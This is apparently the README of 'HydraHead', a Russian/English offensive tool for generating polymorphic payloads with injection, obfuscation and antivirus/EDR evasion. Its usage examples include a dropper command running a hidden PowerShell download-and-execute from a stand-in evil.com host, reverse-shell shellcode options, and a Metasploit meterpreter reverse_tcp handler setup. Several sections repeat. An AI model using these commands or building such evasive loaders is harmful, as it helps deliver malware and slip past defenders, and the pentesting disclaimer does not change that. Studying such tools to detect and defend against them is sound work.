# HydraHead

![HydraHead Logo](https://img.shields.io/badge/HydraHead-Polymorphic%20Payload%20Generator-red)

## Описание проекта / Project Description

HydraHead - это полиморфный инструмент для генерации и доставки вредоносной нагрузки, разработанный для использования в законных тестах на проникновение. Инструмент позволяет создавать полиморфные вредоносные программы, которые могут обходить современные системы обнаружения и предотвращения вторжений.

**Основные возможности:**
- Генерация полиморфной нагрузки различных типов (EXE, DLL, шелл-код, PowerShell, макросы)
- Несколько техник внедрения кода (Process Hollowing, DLL Hollowing, DLL Sideloading)
- Продвинутые методы обфускации для обхода статического анализа
- Техники уклонения от EDR/AV систем
- Модульная архитектура для простого расширения функциональности

HydraHead is a polymorphic payload generation and delivery tool designed for legitimate penetration testing. The tool allows you to create polymorphic malware that can bypass modern intrusion detection and prevention systems.

**Key Features:**
- Generation of polymorphic payloads of various types (EXE, DLL, shellcode, PowerShell, macros)
- Multiple code injection techniques (Process Hollowing, DLL Hollowing, DLL Sideloading)
- Advanced obfuscation methods to bypass static analysis
- EDR/AV evasion techniques
- Modular architecture for easy extension of functionality

## Использование / Usage

```
python main.py generate --type exe --payload "calc.exe" --output malware.exe --obfuscation high --evasion
```

Для генерации шелл-кода:
```
python demo_shellcode.py --host 192.168.1.100 --port 4444 --output shell.bin --obfuscate --level high
```

```
python main.py generate --type exe --payload "calc.exe" --output malware.exe --obfuscation high --evasion
```

For shellcode generation:
```
python demo_shellcode.py --host 192.168.1.100 --port 4444 --output shell.bin --obfuscate --level high
```

## Предупреждение / Warning

Этот инструмент предназначен **ТОЛЬКО** для образовательных целей и легитимного тестирования на проникновение. Использование HydraHead для несанкционированного доступа к компьютерным системам или других злонамеренных действий является незаконным и неэтичным.

Авторы не несут ответственности за любой ущерб, причиненный неправильным использованием этого программного обеспечения.

This tool is intended **ONLY** for educational purposes and legitimate penetration testing. Using HydraHead for unauthorized access to computer systems or other malicious actions is illegal and unethical.

The authors take no responsibility for any damage caused by the misuse of this software.

## Архитектура / Architecture

HydraHead имеет модульную архитектуру, разделенную на следующие компоненты:

- **Генераторы**: Создают полезную нагрузку различных типов
- **Обфускаторы**: Применяют различные техники обфускации к коду
- **Загрузчики**: Реализуют различные техники внедрения кода
- **Техники обхода**: Методы для обхода EDR/AV систем

HydraHead has a modular architecture divided into the following components:

- **Generators**: Create payloads of various types
- **Obfuscators**: Apply various code obfuscation techniques
- **Loaders**: Implement various code injection techniques
- **Evasion Techniques**: Methods for bypassing EDR/AV systems

## Основные возможности / Key Features

- Генерация исполняемых файлов (EXE)
- Генерация шелл-кода
- Генерация PowerShell скриптов
- Множественная обфускация кода
- Техники обхода обнаружения (анти-виртуализация, анти-отладка и т.д.)
- Различные методы доставки нагрузки

## Установка / Installation

```
git clone https://github.com/yourusername/HydraHead.git
cd HydraHead
pip install -r requirements.txt
```

## Генерация нагрузки / Payload Generation

### Генерация EXE-файла / EXE File Generation
```bash
python main.py generate --type exe --payload "calc.exe" --output payload.exe
```

### Генерация PowerShell-скрипта / PowerShell Script Generation
```bash
python main.py generate --type ps1 --payload "Start-Process calc.exe" --output payload.ps1 --obfuscation high
```

### Генерация с техниками обхода обнаружения / Generation with Evasion Techniques
```bash
python main.py generate --type exe --payload "cmd.exe /c whoami" --output stealth.exe --evasion --obfuscation high
```

## Управление шаблонами / Template Management

### Список доступных шаблонов
```bash
python main.py template --list
```

### Добавление нового шаблона
```bash
python main.py template --add /path/to/template
```

## Система тестирования / Testing System

Проект включает систему тестирования для проверки работоспособности компонентов.

### Запуск всех тестов / Run All Tests
```bash
python tests/run_tests.py
```

### Запуск тестов для определенных компонентов / Run Tests for Specific Components

#### Тестирование генераторов
```bash
python tests/run_tests.py --type generators
```

#### Тестирование обфускаторов
```bash
python tests/run_tests.py --type obfuscators
```

#### Подробный вывод результатов тестирования
```bash
python tests/run_tests.py --verbose
```

## Структура проекта / Project Structure

```
HydraHead/
├── core/               # Основные компоненты 
│   ├── config.py       # Конфигурация
│   ├── interfaces.py   # Базовые интерфейсы
│   └── manager.py      # Управление генерацией
├── evasion/            # Техники обхода обнаружения
├── generators/         # Генераторы различных типов нагрузки
├── loaders/            # Загрузчики для внедрения нагрузки
├── obfuscators/        # Техники обфускации кода
├── output/             # Директория для сгенерированных файлов
├── templates/          # Шаблоны для генерации
├── tests/              # Тесты
└── utils/              # Вспомогательные утилиты
```

## Дополнительная информация / Additional Information

- Используйте этот инструмент только в этических целях
- Протестируйте возможности на собственных системах
- Изучите код для лучшего понимания техник обфускации и обхода обнаружения

## Особенности / Features

- Генерация уникальных экземпляров нагрузки с каждым запуском
- Мощные методы обфускации кода
- Техники обхода антивирусов и EDR-решений
- Поддержка различных форматов нагрузки (EXE, DLL, шелл-код, PS1, и др.)
- Модульная архитектура, позволяющая легко расширять функциональность

## Установка / Installation

1. Клонировать репозиторий:
```
git clone [ссылка_на_репозиторий]
cd HydraHead
```

2. Установить зависимости:
```
pip install -r requirements.txt
```

3. (Необязательно) Для работы некоторых функций требуется дополнительное ПО:
   - mingw-w64 (для компиляции C-кода в Windows)
   - Metasploit Framework (для генерации шелл-кода)

## Основное использование / Basic Usage

```bash
python main.py generate --type exe --payload "echo Hello World" --output evil.exe --obfuscation high --evasion
```

### Параметры / Parameters

- `--type` - тип нагрузки (exe, dll, shellcode, ps1, py, js)
- `--payload` - полезная нагрузка или путь к файлу
- `--output` - путь к выходному файлу
- `--obfuscation` - уровень обфускации (low, medium, high, max)
- `--evasion` - включить техники обхода обнаружения
- `--iterations` - количество итераций обфускации

### Примеры использования / Usage Examples

#### 1. Создание простого EXE-файла с командой / 1. Creating a simple EXE file with a command
```bash
python main.py generate --type exe --payload "cmd.exe /c calc.exe" --output calc_launcher.exe
```

#### 2. Создание EXE с повышенным уровнем обфускации / 2. Creating an EXE with an advanced obfuscation level
```bash
python main.py generate --type exe --payload "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://evil.com/script.ps1'))\"" --output dropper.exe --obfuscation high --evasion
```

#### 3. Генерация нагрузки на основе шелл-кода (используя demo_shellcode.py) / 3. Generating a payload based on shellcode (using demo_shellcode.py)
```bash
python demo_shellcode.py --host 192.168.1.100 --port 4444 --output shell.exe --obfuscation max --evasion --iterations 2
```

## Генерация шелл-кода через Metasploit / Shellcode Generation via Metasploit

Для создания шелл-кода с помощью Metasploit и нашей системы выполните:

1. Запустите скрипт для генерации шелл-кода:
```bash
python demo_shellcode.py --host <IP> --port <PORT> --output shellcode.exe --obfuscation high --evasion
```

2. Настройте обработчик в Metasploit для приема соединения:
```bash
msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
run
```

## Техники обфускации / Obfuscation Techniques

- Обфускация строк
- Переименование переменных
- Добавление мертвого кода
- Усложнение потока управления
- Виртуализация кода

## Методы обхода обнаружения / Evasion Methods

- Обнаружение и обход виртуальных машин
- Обнаружение отладчиков
- Временные задержки
- Проверка запущенных процессов
- Проверка сетевого окружения

## Расширение функциональности / Extending Functionality

Для добавления новых компонентов, следуйте соответствующим интерфейсам:

- Для новых генераторов: `core/interfaces.py:BaseGenerator`
- Для новых обфускаторов: `core/interfaces.py:BaseObfuscator`
- Для новых техник обхода: добавьте в директорию `evasion/`

## Ограничение ответственности / Disclaimer

Данный инструмент разработан исключительно для образовательных целей и легального тестирования на проникновение. Авторы не несут ответственности за любое неправомерное использование данного программного обеспечения.

## Лицензия / License

MIT

